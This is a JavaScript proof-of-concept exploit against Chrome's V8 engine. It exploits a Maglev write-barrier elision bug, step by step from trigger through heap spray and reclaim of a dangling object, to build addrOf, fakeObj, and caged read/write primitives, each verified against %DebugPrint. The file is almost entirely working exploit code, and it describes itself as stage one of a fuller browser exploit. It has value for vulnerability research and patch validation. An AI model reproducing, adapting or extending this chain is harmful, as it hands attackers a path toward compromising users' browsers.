// ============================================================================
//  Chrome / V8 Renderer -- Part 1 -- INTERMEDIARY PoC
//  Maglev write-barrier elision  ==>  addrOf / fakeObj / caged read / caged write
//
//  The middle step between the other two PoCs here: poc0.js is the bare trigger
//  (proves the bug, does nothing with it); poc.html is the full exploit (every
//  stage at once, Windows-tuned, hard to read). This file takes ONLY Stage 1 of
//  poc.html -- turning the trigger into the four classic primitives -- and walks
//  it one step at a time, checking each primitive against %DebugPrint. No sandbox
//  escape.
//
//  Build: V8 14.6.202.33 (commit f09a912) release d8, any arch.
//  Run:   d8 --allow-natives-syntax --maglev --no-turbofan poc3.js
//
//  Step 1's reclaim is GC-timing dependent: a run occasionally prints "[FAIL]"
//  and exits cleanly -- just re-run.
// ============================================================================

// -- console helpers ---------------------------------------------------------
function log(s)       { print(s); }
function ok(s)        { print('  [ok]   ' + s); }
function step(s)      { print('\n=== ' + s + ' ==='); }
function hex(x)       { return '0x' + (x >>> 0).toString(16); }
function die(s)       { print('[FAIL] ' + s); throw new Error(s); }
function assert(c, s) { if (!c) die(s); }

// -- type punning: view 8 bytes as one double or as two 32-bit halves ---------
// A FixedDoubleArray element IS a double; the exploit reads/writes it as the pair
// of compressed pointers / Smis packed into those bytes. pack(lo,hi) builds the
// double whose halves are lo and hi.
const punF = new Float64Array(1);
const punU = new Uint32Array(punF.buffer);          // [lo32, hi32]
const punI = new Int32Array(punF.buffer);
function pack(lo, hi) { punU[0] = lo >>> 0; punU[1] = hi >>> 0; return punF[0]; }

// A Float64Array whose element, once read out, is handed to us as a genuine
// HeapNumber -- the non-Smi value we smuggle through the buggy store in Step 0.
const hnSrc = new Float64Array(1); hnSrc[0] = 11.0;

// -- build constants (compressed, i.e. 32-bit-in-cage, values) ----------------
// V8 pointer compression puts every heap pointer at a 32-bit offset in a 4 GB
// "cage". HN_MAP/EMPTY_FA are ReadOnlySpace and were identical on every build
// tested (mac arm64, linux x64, Windows x64, and poc.html's Windows Chrome).
// DOUBLE_MAP is OldSpace/snapshot-specific and MUST be rederived per build: it is
// 0x0100cf51 on release d8 for mac arm64 + linux x64, but 0x0100cd59 on the
// Windows x64 release d8, and 0x1032999 on the Chrome build. Rederive with:
//   d8 --allow-natives-syntax -e '%DebugPrint([1.1])'
// and take the low 32 bits of the PACKED_DOUBLE_ELEMENTS map line.
const HN_MAP     = 0x515;         // HeapNumber map
const EMPTY_FA   = 0x7bd;         // empty_fixed_array
const DOUBLE_MAP = 0x0100cf51;    // PACKED_DOUBLE JSArray map (mac/linux; see note)

// A recognizable Smi. On the heap a Smi is stored << 1 (tag bit 0), so a memory
// scan looks for MARKER_TAG.
const MARKER     = 0x1badc0de;
const MARKER_TAG = (MARKER << 1) >>> 0;

// ============================================================================
//  THE BUG.  Maglev's MaglevGraphBuilder::BuildCheckSmi decides whether a value
//  needs a runtime Smi check before a store. It wrongly treats "fits in the
//  31-bit Smi range" as "IS a Smi". A HeapNumber holding e.g. 11.0 fits the range
//  but is a *pointer* to an allocated object. Mislabelled as a Smi, the store is
//  compiled as StoreTaggedFieldNoWriteBarrier, so writing that HeapNumber pointer
//  into an old-space cell skips the old->new write barrier. The GC never learns
//  the cell points at a young object, reclaims it, and the cell is left dangling.
// ============================================================================

// ============================================================================
//  STEP 0 -- THE TRIGGER: coax Maglev onto the buggy BuildCheckSmi path.
//
//  Store the same parameter x into three script cells in order; each store hands
//  Maglev a fact about x that the next one relies on:
//    aT (kInt32 ContextCell)     : attaches a kInt32 alternative to x, and does
//                                  not deopt when x is a HeapNumber.
//    bT (kConst ContextCell)     : records the checked int32 constant 11 for x.
//    cT (kConstantType Property- : the target. Its store reaches BuildCheckSmi,
//        Cell)                     which reads that constant off x, calls x a Smi,
//                                  and elides the write barrier.
//  We warm on the Smi 11 (so Maglev compiles the function), then fire once with
//  hnSrc[0] = 11.0 as a real HeapNumber: it lands in cT with no write barrier.
//
//  aD*/bD*/cD* + decoy1..3 are identical decoy triplets that keep the young-gen
//  allocation stream uniform so the freed HeapNumber lands where we spray next.
//  (poc0.js is exactly this trigger, minimized.)
// ============================================================================
let aD1=0;aD1=0x40000000;let bD1=11;var cD1=0;cD1=1;
let aD2=0;aD2=0x40000000;let bD2=11;var cD2=0;cD2=1;
let aD3=0;aD3=0x40000000;let bD3=11;var cD3=0;cD3=1;
let aT =0;aT =0x40000000;let bT =11;var cT =0;cT =1;
function decoy1(x)  { aD1 = x; bD1 = x; cD1 = x; }
function decoy2(x)  { aD2 = x; bD2 = x; cD2 = x; }
function decoy3(x)  { aD3 = x; bD3 = x; cD3 = x; }
function trigger(x) { aT  = x; bT  = x; cT  = x;  }   // cT is the target cell
function warm(n)    { for (let i = 0; i < n; i++) { decoy1(11); decoy2(11); decoy3(11); trigger(11); } }

// -- primitives over a PACKED_DOUBLE array, JIT-warmed so they never allocate in
//    the timing-sensitive region. `off` is a FixedDoubleArray byte offset (8-byte
//    header, then 8-byte elements); ((off&~7)-8)>>3 maps it to a JS element index.
function findSentinel(arr, lo, hi) {          // -> (elemIndex<<1)|half, or -1
  for (let i = lo; i < hi; i++) {
    punF[0] = arr[i];
    if (punI[0] === (MARKER_TAG | 0)) return i << 1;
    if (punI[1] === (MARKER_TAG | 0)) return (i << 1) | 1;
  }
  return -1;
}
function readWord(arr, off) {
  punF[0] = arr[((off & ~7) - 8) >>> 3];
  return (off & 4) ? punI[1] : punI[0];
}
function writeWord(arr, off, v) {
  const i = ((off & ~7) - 8) >>> 3;
  punF[0] = arr[i];
  if (off & 4) punI[1] = v | 0; else punI[0] = v | 0;
  arr[i] = punF[0];
}

// The array behind addrOf/fakeObj: element[0] is an object we swap in and out,
// element[1] the marker Smi we locate it by. altObj is a distinct toggle object.
let objArr = [{}, MARKER];
let altObj = {};

const ELEMS = 256, NSPRAY = 600;
let spray = new Array(NSPRAY), seaArr;

// warm-up 1: let Maglev compile the trigger + decoys (the stall loop gives the
// background compiler time to finish).
(function warmUp1() {
  warm(3000);
  let j = 0; for (let i = 0; i < 1000000; i++) j += i;
  warm(1000);
})();

// ============================================================================
//  STEP 1 -- TRIGGER MINOR GC & HEAP SPRAY.
//
//  cT points at a 12-byte HeapNumber [map(4)|value(8)] the GC may reclaim; we want
//  cT -- still a "HeapNumber" to JS -- to read back bytes WE control.
//
//  Caveat: the tidy mental model is "spray 12-byte allocations to cleanly reclaim
//  the HeapNumber". In reality a minor GC recycles the whole young-gen region the
//  HeapNumber lived in, and the large double-array backing stores we spray get
//  carved out of it. cT ends up at some 4-byte-aligned offset (kTaggedSize -- both
//  a HeapNumber and a double-array backing store are only tagged-aligned, so cT can
//  land on either half of a double) *inside one of those arrays* -- unknown which.
//  That is why the "Locate cT" plumbing below has to recover the landing spot
//  afterward.
//
//  Every spray element is the double 0x00000515_00000515 (HN_MAP in both halves),
//  a "sea of 0x515": wherever cT lands, its map word is a valid HeapNumber map
//  (typeof cT stays "number") and its value word reads 0x00000515_00000515.
// ============================================================================
(function buildSpray() {
  seaArr = [pack(HN_MAP, HN_MAP)];
  for (let e = 1; e < ELEMS; e++) seaArr.push(seaArr[0]);
  for (let s = 0; s < NSPRAY; s++) spray[s] = seaArr.slice();
})();

// warm-up 2: also compile findSentinel/readWord, so the region below allocates
// nothing of its own.
(function warmUp2() {
  warm(5000);
  for (let w = 0; w < 5000; w++) { findSentinel(seaArr, 0, 256); readWord(seaArr, 16); }
  let j = 0; for (let i = 0; i < 2000000; i++) j += i;
  warm(2000);
  for (let w = 0; w < 2000; w++) { findSentinel(seaArr, 0, 256); readWord(seaArr, 16); }
})();

step('STEP 1  Trigger, then reclaim the freed HeapNumber');

trigger(hnSrc[0]);        // fire the bug: store the HeapNumber into cT, unbarriered

// churn: spray more sea arrays to force a minor GC that frees the dangling
// HeapNumber and reuses its memory for one of these backing stores.
const CHURN_PER_ROUND = 1100, CHURN_ROUNDS = 20;
let churnArrs = new Array(CHURN_PER_ROUND * CHURN_ROUNDS), churnCount = 0;
(function churn() {
  for (let r = 0; r < CHURN_ROUNDS; r++) {
    for (let s = 0; s < CHURN_PER_ROUND; s++) churnArrs[churnCount++] = seaArr.slice();
    if (typeof cT !== 'number') return;                 // reclaimed onto a non-number, or
    punF[0] = cT; if (punU[1] !== 0x40260000) return;   // no longer reads 11.0 -> reclaimed
  }
})();

assert(typeof cT === 'number', 'cT landed on a non-number header (reclaim miss)');
punF[0] = cT;
assert(punU[0] === HN_MAP && punU[1] === HN_MAP,
       'reclaim miss: cT reads ' + hex(punU[1]) + '_' + hex(punU[0]));
ok('cT dangles into the 0x515 sea (reclaimed after ' + churnCount + ' churn arrays)');

// ---- Locate cT inside the spray (box-less; needed per the caveat above) ------
// (a) which element index / 4-byte half does cT overlap? Poke element[k] of every
//     array with probeDbl (0x517 in the high half) and watch cT's read change.
// (b) which specific array? Poke element[elemIdx] of one array at a time.
const probeDbl = pack(HN_MAP, 0x517);
const seaDbl   = pack(HN_MAP, HN_MAP);
let elemIdx = -1, align = -1;
(function findElement() {
  for (let k = 0; k < ELEMS; k++) {
    for (let s = 0; s < NSPRAY; s++)     spray[s][k]     = probeDbl;
    for (let s = 0; s < churnCount; s++) churnArrs[s][k] = probeDbl;
    if (typeof cT !== 'number') { elemIdx = k; align = 4; return; }
    punF[0] = cT;
    if (punU[0] === 0x517) { elemIdx = k;     align = 0; return; }   // low half
    if (punU[1] === 0x517) { elemIdx = k - 1; align = 4; return; }   // high half
    for (let s = 0; s < NSPRAY; s++)     spray[s][k]     = seaDbl;
    for (let s = 0; s < churnCount; s++) churnArrs[s][k] = seaDbl;
  }
})();
assert(elemIdx >= 0, 'could not locate cT within the spray');
ok('cT overlaps element [' + elemIdx + '] at +' + align + ' bytes');

let arrIdx = -1, srcPool = null;
(function findSource() {
  for (let s = 0; s < NSPRAY; s++)     spray[s][elemIdx]     = probeDbl;
  for (let s = 0; s < churnCount; s++) churnArrs[s][elemIdx] = probeDbl;
  if (align === 0) {
    for (let s = 0; s < churnCount; s++) {
      churnArrs[s][elemIdx] = seaDbl; punF[0] = cT;
      if (punI[0] !== 0x517) { arrIdx = s; srcPool = churnArrs; return; }
      churnArrs[s][elemIdx] = probeDbl;
    }
    for (let s = 0; s < NSPRAY; s++) {
      spray[s][elemIdx] = seaDbl; punF[0] = cT;
      if (punI[0] !== 0x517) { arrIdx = s; srcPool = spray; return; }
      spray[s][elemIdx] = probeDbl;
    }
  } else {
    for (let s = 0; s < churnCount; s++) {
      churnArrs[s][elemIdx] = seaDbl;
      if (typeof cT === 'number') { arrIdx = s; srcPool = churnArrs; return; }
      churnArrs[s][elemIdx] = probeDbl;
    }
    for (let s = 0; s < NSPRAY; s++) {
      spray[s][elemIdx] = seaDbl;
      if (typeof cT === 'number') { arrIdx = s; srcPool = spray; return; }
      spray[s][elemIdx] = probeDbl;
    }
  }
})();
assert(arrIdx >= 0, 'could not identify cT source array');
ok('source array = ' + (srcPool === churnArrs ? 'churnArrs' : 'spray') + '[' + arrIdx + ']');
// We now own the bytes cT points at: writing srcPool[arrIdx][elemIdx] rewrites
// cT's underlying object. Stop pretending cT is a HeapNumber.

// ============================================================================
//  STEP 2 -- FORGE AN EMPTY JSArray over cT.
//  STEP 3 -- FORCE BACKING-STORE ALLOCATION -> MEMORY ANCHOR.
//
//  A JSArray is four compressed words [map, properties, elements, length]. We
//  overwrite the double(s) cT covers with a fake header. When cT's value field is
//  4-byte-shifted (align 4) the four words straddle three doubles instead of two,
//  so we pad the two untouched halves with HN_MAP.
// ============================================================================
step('STEP 2/3  Forge empty JSArray, force backing store, leak the anchor');

function forgeArray(map, properties, elements, length) {
  const a = srcPool[arrIdx];
  if (align === 0) {
    a[elemIdx]     = pack(map, properties);
    a[elemIdx + 1] = pack(elements, length);
  } else {
    a[elemIdx]     = pack(HN_MAP, map);            // low half = filler
    a[elemIdx + 1] = pack(properties, elements);
    a[elemIdx + 2] = pack(length, HN_MAP);         // high half = filler
  }
}

// (2) forge an empty PACKED_DOUBLE array -- cT is now a real (empty) array to V8.
forgeArray(DOUBLE_MAP, EMPTY_FA, EMPTY_FA, 0);

// (3) grow it by one element: V8 allocates a fresh FixedDoubleArray backing store
//     and writes its compressed pointer into our `elements` field. Read it back --
//     this first leaked in-cage address is the MEMORY ANCHOR for the marker scan (Step 6).
cT[0] = 1.1;
punF[0] = srcPool[arrIdx][elemIdx + 1];
let anchor = (align === 0 ? punI[0] : punI[1]) - 1;   // elements pointer, tag stripped
assert(anchor > 0 && cT[0] === 1.1, 'anchor leak failed (' + hex(anchor) + ')');
ok('memory anchor = ' + hex(anchor) + '  (first leaked in-cage address)');

// ============================================================================
//  STEP 4 -- WIDEN elements + length  ==>  CAGED READ / WRITE.
//  Re-forge the header as a cage-wide window: elements = cage offset 0, length =
//  0x3fffffff. cT[i] now reads/writes the 8 bytes at cage_base + 8 + i*8, with i
//  spanning the whole 4 GB cage.
// ============================================================================
step('STEP 4  Widen elements+length  ==>  caged read / caged write');

// Allocate objArr now, just after the anchor, so the marker scan (Step 6) window is tiny.
objArr = [altObj, MARKER];

forgeArray(DOUBLE_MAP, EMPTY_FA, 1, 0x7ffffffe);      // elements=cage[0], length=max

// PRIMITIVES 1 & 2 -- caged read / write of a 32-bit word at an absolute cage offset.
function cageRead(off)     { return readWord(cT, off) >>> 0; }
function cageWrite(off, v) { writeWord(cT, off, v); }
ok('caged read/write online (cT is a 0x3fffffff-element window over the cage)');

// ============================================================================
//  STEP 5 -- ALLOCATE TARGET ARRAY (objArr, done above).
//  STEP 6 -- SCAN FOR MARKER  ==>  addrOf / fakeObj.
//  objArr[1] holds MARKER; find it in [anchor, anchor+1KB). Confirm it is the
//  right array by toggling objArr[0] and checking the word just before the marker
//  (that word is objArr[0], the slot addrOf/fakeObj operate on).
// ============================================================================
step('STEP 5/6  Scan for the marker  ==>  addrOf / fakeObj');

let objSlot = -1;
{
  let lo = (anchor & ~7) >>> 3, hi = ((anchor + 1024) & ~7) >>> 3, i = lo;
  while (i < hi) {
    let h = findSentinel(cT, i, hi);
    if (h < 0) break;
    let cand = (h & 1) ? ((h >>> 1) * 8 + 12 - 4) : ((h >>> 1) * 8 + 8 - 4);  // elem[0] = 4B before marker
    i = (h >>> 1) + 1;
    let before = cageRead(cand);
    if ((before & 1) !== 1) continue;          // objArr[0] must be a tagged pointer
    objArr[0] = objArr;                         // toggle: the word at cand must change
    let after = cageRead(cand);
    objArr[0] = altObj;
    if (after !== before && (after & 1) === 1) { objSlot = cand; break; }
  }
}
assert(objSlot >= 0, 'marker scan failed near anchor ' + hex(anchor));
ok('objArr element[0] at cage offset ' + hex(objSlot));

// PRIMITIVE 3 addrOf: put an object in objArr[0], read its compressed pointer.
// PRIMITIVE 4 fakeObj: write a tagged address into objArr[0], read it back as obj.
function addrOf(o)  { objArr[0] = o; return cageRead(objSlot) - 1; }
function fakeObj(a) { cageWrite(objSlot, (a | 1) >>> 0); return objArr[0]; }
ok('addrOf / fakeObj online');

// ============================================================================
//  DEMONSTRATION -- check each primitive against ground truth. %DebugPrint (the
//  only natives use here; the trigger warms up like it would in a browser) prints
//  each object's REAL address so the leaked values can be eyeballed.
// ============================================================================
step('DEMONSTRATION  Verify each primitive against %DebugPrint');

// addrOf vs the address %DebugPrint reports.
let victim = { tag: 0x41414141 };
log('  %DebugPrint(victim) prints the real address next:');
%DebugPrint(victim);
log('  addrOf(victim) = ' + hex(addrOf(victim)) + '   (low bits match the address above)');

// caged read: the map word at a real double array must equal DOUBLE_MAP.
let probe = [1.1, 2.2, 3.3, 4.4];
let pa = addrOf(probe);
assert(cageRead(pa) === DOUBLE_MAP, 'caged read wrong: ' + hex(cageRead(pa)));
ok('caged read : map@addrOf([..]) = ' + hex(cageRead(pa)) + ' === DOUBLE_MAP');

// caged write: change probe.length (a Smi at object offset +0xc) from the cage.
let len0 = probe.length;
cageWrite(pa + 0xc, 0x1234 << 1);
assert(probe.length === 0x1234, 'caged write wrong: ' + probe.length);
ok('caged write: probe.length ' + len0 + ' -> ' + probe.length + ' (=0x1234)');
cageWrite(pa + 0xc, 4 << 1);                   // restore

// fakeObj inverts addrOf.
assert(fakeObj(addrOf(probe)) === probe, 'fakeObj round-trip failed');
ok('fakeObj  : fakeObj(addrOf(probe)) === probe');

// fakeObj type confusion: stamp a JSArray header into a double array's bytes and
// materialize an object over them -- the lever the full exploit uses to forge,
// e.g., a fake ExternalString. Drop the fake reference at once (it aliases
// young-gen data, which a GC must not trace).
let container = [1.1, 2.2, 3.3, 4.4];
let fda = (cageRead(addrOf(container) + 8) - 1) >>> 0;      // container.elements address
cageWrite(fda + 8 + 0, DOUBLE_MAP);       cageWrite(fda + 8 + 4, EMPTY_FA);      // map | properties
cageWrite(fda + 8 + 8, fda + 0x18 + 1);   cageWrite(fda + 8 + 12, 2 << 1);       // elements | length
let fakeLen = fakeObj(fda + 8).length;
objArr[0] = altObj;                                        // drop the fake object now
ok('fakeObj  : forged a JSArray over controlled bytes, fake.length = ' + fakeLen);

// ============================================================================
//  CLEANUP -- leave the heap safe for the GC d8 runs at shutdown. cT is a fake
//  JSArray whose `elements` points at cage offset 0; as a live root it would crash
//  the next scavenge in SafeSizeFromMap. Dropping it (cT = 0) is the load-bearing
//  fix; we also restore the sprayed slot we defaced.
// ============================================================================
(function cleanup() {
  srcPool[arrIdx][elemIdx]     = seaDbl;
  srcPool[arrIdx][elemIdx + 1] = seaDbl;
  if (align) srcPool[arrIdx][elemIdx + 2] = seaDbl;
  objArr[0] = altObj;
  cT = 0;                        // must be last: the reads/writes above still need cT
})();

log('\n================================================================');
log(' ALL FOUR PRIMITIVES VERIFIED: addrOf / fakeObj / caged read / caged write');
log(' (Stage 1 of poc.html, stopping before the sandbox escape)');
log('================================================================');
